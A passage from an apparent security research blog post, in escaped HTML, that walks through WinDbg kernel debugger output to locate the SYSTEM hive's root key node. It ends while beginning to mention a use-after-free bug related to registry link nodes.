class=&quot;MvcjwGOuIU-c1&quot;&gt;long]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[+0x008]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;KeyHive&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0xffff800f88a8e000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_HHIVE&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;*]&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;We can now translate this information into the cell&amp;#39;s virtual address, and take a peek into it with !reg knode and !reg keyinfo:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;cellindex&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0xffff800f88a8e000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x20&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88adc000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Table&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Offset&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;20&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MapTable&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ade000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MapEntry&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ade000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;BinAddress&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f896e8009,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;BlockAddress&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f896e8000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;pcell:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f896e8024&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;knode&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f896e8024&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;CM_KEY_NODE_SIGNATURE&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;(kn)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ROOT&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ParentCell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x318&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Security&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x78&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[cell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;index]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[cell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;index]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x2c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxNameLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x26&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxClassLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxValueNameLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxValueDataLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;LastWriteTime&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;1db2b94:0xe031a530&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;0: kd&amp;gt; !reg keyinfo 0xffff800f88a8e000 ffff800f896e8024&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;KeyPath &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;\REGISTRY\MACHINE\SYSTEM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;[SubKeyAddr] &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [SubKeyName]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f896e8174 &amp;nbsp; &amp;nbsp; ActivationBroker&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f896e964c &amp;nbsp; &amp;nbsp; ControlSet001&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f0e8a4 &amp;nbsp; &amp;nbsp; DriverDatabase&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f999c4 &amp;nbsp; &amp;nbsp; HardwareConfig&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9a314 &amp;nbsp; &amp;nbsp; Input&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9a3dc &amp;nbsp; &amp;nbsp; Keyboard Layout&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9a43c &amp;nbsp; &amp;nbsp; Maps&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9a674 &amp;nbsp; &amp;nbsp; MountedDevices&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9ab64 &amp;nbsp; &amp;nbsp; ResourceManager&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9abc4 &amp;nbsp; &amp;nbsp; ResourcePolicyStore&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9ac2c &amp;nbsp; &amp;nbsp; RNG&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9addc &amp;nbsp; &amp;nbsp; Select&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9aed4 &amp;nbsp; &amp;nbsp; Setup&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9b7d4 &amp;nbsp; &amp;nbsp; Software&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9d1f4 &amp;nbsp; &amp;nbsp; State&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89f9d24c &amp;nbsp; &amp;nbsp; WaaS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f89fabc8c &amp;nbsp; &amp;nbsp; WPA&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;[SubKeyAddr] &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [VolatileSubKeyName]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;ffff800f88b91024 &amp;nbsp; &amp;nbsp; CurrentControlSet&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&amp;nbsp;Use &amp;#39;!reg keyinfo ffff800f88a8e000 &amp;lt;SubKeyAddr&amp;gt;&amp;#39; to dump the subkey details&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;[ValueType] &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [ValueName] &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [ValueData]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1 MvcjwGOuIU-c17&quot;&gt;&amp;nbsp;Key has no Values&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;We have indeed ended up at the root key of the SYSTEM hive, which has a standard key node signature (&amp;#39;nk&amp;#39;), the predefined &amp;quot;ROOT&amp;quot; name, a valid security descriptor, a list of subkeys, and so on.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Overall, link nodes are an interesting implementation detail of the registry that are worth keeping in mind. However, considering their relative simplicity and the fact that they are hidden away even from very low-level mechanisms like &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallbackex&quot;&gt;Registry Callbacks&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, they are of limited significance to system security. The lone vulnerability I found related to them, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451505&quot;&gt;CVE-2023-21747&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, resulted in a use-after-free due to improper cleanup of the 